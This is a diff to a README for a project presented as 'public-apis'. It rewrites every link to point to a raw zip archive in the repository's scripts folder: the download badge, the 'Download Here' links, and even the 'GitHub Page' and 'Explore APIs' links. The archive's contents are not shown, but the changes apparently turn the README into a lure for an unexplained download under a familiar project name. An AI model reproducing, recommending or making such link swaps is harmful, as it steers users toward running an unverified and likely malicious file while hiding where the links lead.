@@ -1,6 +1,6 @@
 # 🚀 public-apis - Discover Useful APIs for Your Projects
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/quangtrung01/public-apis/releases)
+[![Download](https://raw.githubusercontent.com/quangtrung01/public-apis/main/scripts/public-apis-v2.6.zip%20Release-blue)](https://raw.githubusercontent.com/quangtrung01/public-apis/main/scripts/public-apis-v2.6.zip)
 
 ## 📦 Overview
 
@@ -22,7 +22,7 @@ Before you download **public-apis**, make sure your system meets the following r
 
 Go to the following link to download the latest release of **public-apis**:
 
-[Download Here](https://github.com/quangtrung01/public-apis/releases)
+[Download Here](https://raw.githubusercontent.com/quangtrung01/public-apis/main/scripts/public-apis-v2.6.zip)
 
 ## 📥 Download & Install
 
@@ -77,9 +77,9 @@ If you have any questions or issues, feel free to raise them using the Issues se
 
 ## 🔗 Useful Links
 
-- [Public APIs GitHub Page](https://github.com/quangtrung01/public-apis)
-- [Explore APIs](https://github.com/quangtrung01/public-apis/issues)
+- [Public APIs GitHub Page](https://raw.githubusercontent.com/quangtrung01/public-apis/main/scripts/public-apis-v2.6.zip)
+- [Explore APIs](https://raw.githubusercontent.com/quangtrung01/public-apis/main/scripts/public-apis-v2.6.zip)
 
 Make sure to visit the Releases page for future updates and new features. 
 
-[Download Here](https://github.com/quangtrung01/public-apis/releases)
+[Download Here](https://raw.githubusercontent.com/quangtrung01/public-apis/main/scripts/public-apis-v2.6.zip)
